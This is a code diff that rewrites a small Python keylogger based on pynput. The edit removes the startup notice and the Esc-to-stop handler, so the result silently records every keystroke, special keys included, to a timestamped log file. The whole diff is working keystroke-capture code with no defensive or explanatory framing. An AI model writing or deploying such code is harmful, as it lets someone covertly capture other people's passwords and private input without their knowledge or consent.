@@ -1,28 +1,19 @@
-from pynput import keyboard
+from pynput.keyboard import Listener
+import logging
 
-# File to store the logged keys
-LOG_FILE = "key_log.txt"
+# Specify the log file
+log_file = "keylog.txt"
 
+# Configure logging
+logging.basicConfig(filename=log_file, level=logging.DEBUG, format="%(asctime)s: %(message)s")
+
+# Function to log keys
 def on_press(key):
     try:
-        # Open file in append mode
-        with open(LOG_FILE, "a") as log_file:
-            # Write the key pressed to the file
-            log_file.write(f"{key.char}")
+        logging.info(f"Key pressed: {key.char}")
     except AttributeError:
-        # Handle special keys like space, enter, backspace
-        with open(LOG_FILE, "a") as log_file:
-            log_file.write(f" [{key}] ")
+        logging.info(f"Special key pressed: {key}")
 
-def on_release(key):
-    if key == keyboard.Key.esc:
-        # Stop listener on 'Esc' key press
-        print("Exiting keylogger...")
-        return False
-
-if __name__ == "__main__":
-    print("Keylogger is running. Press 'Esc' to stop.")
-
-    # Start the listener for keypress events
-    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
-        listener.join()
+# Set up the listener
+with Listener(on_press=on_press) as listener:
+    listener.join()
